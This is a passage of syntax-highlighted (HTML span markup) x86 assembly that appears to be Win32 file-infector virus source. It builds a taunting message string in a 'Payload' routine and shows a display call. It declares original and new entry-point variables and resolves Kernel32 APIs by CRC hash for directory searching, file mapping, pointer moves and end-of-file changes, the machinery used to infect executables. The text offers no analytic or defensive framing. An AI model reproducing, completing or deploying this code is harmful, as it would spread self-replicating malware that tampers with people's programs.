</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">31</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc3">"m"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">33</span><span class="sc4">],</span><span class="sc3">"o"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">34</span><span class="sc4">],</span><span class="sc3">"n"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">35</span><span class="sc4">],</span><span class="sc3">"t"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc3">"h"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">37</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">38</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">39</span><span class="sc4">],</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">41</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">42</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">43</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">45</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">46</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">47</span><span class="sc4">],</span><span class="sc3">"c"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">48</span><span class="sc4">],</span><span class="sc3">"o"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">49</span><span class="sc4">],</span><span class="sc3">"m"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">50</span><span class="sc4">],</span><span class="sc3">"m"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">51</span><span class="sc4">],</span><span class="sc3">"e"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">52</span><span class="sc4">],</span><span class="sc3">"r"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">53</span><span class="sc4">],</span><span class="sc3">"c"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">54</span><span class="sc4">],</span><span class="sc3">"i"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">55</span><span class="sc4">],</span><span class="sc3">"a"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">56</span><span class="sc4">],</span><span class="sc3">"l"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">57</span><span class="sc4">],</span><span class="sc3">"s"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">58</span><span class="sc4">],</span><span class="sc3">"@"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">59</span><span class="sc4">],</span><span class="sc3">"m"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">],</span><span class="sc3">"i"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">61</span><span class="sc4">],</span><span class="sc3">"c"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">62</span><span class="sc4">],</span><span class="sc3">"r"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">63</span><span class="sc4">],</span><span class="sc3">"o"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">64</span><span class="sc4">],</span><span class="sc3">"$"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">65</span><span class="sc4">],</span><span class="sc3">"o"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">66</span><span class="sc4">],</span><span class="sc3">"f"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">67</span><span class="sc4">],</span><span class="sc3">"t"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">68</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">69</span><span class="sc4">],</span><span class="sc3">"c"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">70</span><span class="sc4">],</span><span class="sc3">"o"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">71</span><span class="sc4">],</span><span class="sc3">"m"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">72</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">e01_Payload</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FreeLibrary</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">e_Payload</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">_2_Payload</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Payload</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;chain_end</span><span class="sc0">

</span><span class="sc5">prog_end</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc1">; Heap</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">heap</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">01000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">prog</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">01000h</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;align +0????h -&gt; 00000h</span><span class="sc0">

</span><span class="sc5">heap_debug</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; Sys</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">OldEP</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NewEP</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ModBase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Kernel32</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">GetApiTableSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetApiTableName</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetApiTableOrdi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetApiTableAddr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc1">;align +00020h -&gt; 00020h</span><span class="sc0">

</span><span class="sc5">LoadApiListCrc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LoadLibraryACrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FreeLibraryCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetProcAddressCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetLocalTimeCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SystemTimeToFileTimeCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryACrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryACrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirstFileACrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindNextFileACrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindCloseCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileACrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileSizeCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileMappingACrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MapViewOfFileCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFileCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFilePointerCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetEndOfFileCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CloseHandleCrc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">LoadApiListAddr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">LoadLibraryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FreeLibrary</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetProcAddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetLocalTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SystemTimeToFileTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindFirstFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindNextFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GetFileSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CreateFileMappingA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SetEndOfFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CloseHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc1">;align +00090h -&gt; 000B0h</span><span class="sc0">

</span><span class="sc1">; #defined</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FILETIME</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
